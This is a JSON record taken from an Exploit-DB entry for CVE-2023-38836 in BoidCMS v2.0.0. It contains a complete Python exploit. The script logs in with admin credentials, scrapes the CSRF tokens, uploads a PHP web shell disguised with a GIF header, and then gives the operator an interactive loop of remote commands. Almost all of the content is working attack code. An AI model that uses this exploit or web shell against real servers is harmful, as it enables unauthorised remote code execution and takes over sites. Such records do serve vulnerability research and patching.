{"source": "https://www.exploit-db.com/exploits/51741", "vulnName": "BoidCMS v2.0.0 - authenticated file upload vulnerability", "vulnEDBID": "51741", "vulnCVE": "2023-38836", "author": "1337KID", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2023-10-09", "vulnContent": "#!/usr/bin/python3\n# Exploit Title: BoidCMS v2.0.0 - authenticated file upload vulnerability\n# Date: 08/21/2023\n# Exploit Author: 1337kid\n# Vendor Homepage: https://boidcms.github.io/#/\n# Software Link: https://boidcms.github.io/BoidCMS.zip\n# Version: <= 2.0.0\n# Tested on: Ubuntu\n# CVE : CVE-2023-38836\n\nimport requests\nimport re\nimport argparse\n\nparser = argparse.ArgumentParser(description='Exploit for CVE-2023-38836')\nparser.add_argument(\"-u\", \"--url\", help=\"website url\")\nparser.add_argument(\"-l\", \"--user\", help=\"admin username\")\nparser.add_argument(\"-p\", \"--passwd\", help=\"admin password\")\nargs = parser.parse_args()\nbase_url=args.url\nuser=args.user\npasswd=args.passwd\n\ndef showhelp():\n print(parser.print_help())\n exit()\nif base_url == None: showhelp()\nelif user == None: showhelp()\nelif passwd == None: showhelp()\n\nwith requests.Session() as s:\n req=s.get(f'{base_url}/admin')\n token=re.findall('[a-z0-9]{64}',req.text)\n form_login_data={\n  \"username\":user,\n  \"password\":passwd,\n  \"login\":\"Login\",\n }\n form_login_data['token']=token\n s.post(f'{base_url}/admin',data=form_login_data)\n #=========== File upload to RCE\n req=s.get(f'{base_url}/admin?page=media')\n token=re.findall('[a-z0-9]{64}',req.text)\n form_upld_data={\n  \"token\":token,\n  \"upload\":\"Upload\"\n }\n #==== php shell\n php_code=['GIF89a;\\n','<?php system($_GET[\"cmd\"]) ?>']\n with open('shell.php','w') as f:\n  f.writelines(php_code)\n #====\n file = {'file' : open('shell.php','rb')}\n s.post(f'{base_url}/admin?page=media',files=file,data=form_upld_data)\n req=s.get(f'{base_url}/media/shell.php')\n if req.status_code == '404':\n  print(\"Upload failed\")\n  exit()\n print(f'Shell uploaded to \"{base_url}/media/shell.php\"')\n while 1:\n  cmd=input(\"cmd >> \")\n  if cmd=='exit': exit()\n  req=s.get(f'{base_url}/media/shell.php',params = {\"cmd\": cmd})\n  print(req.text)\n            "}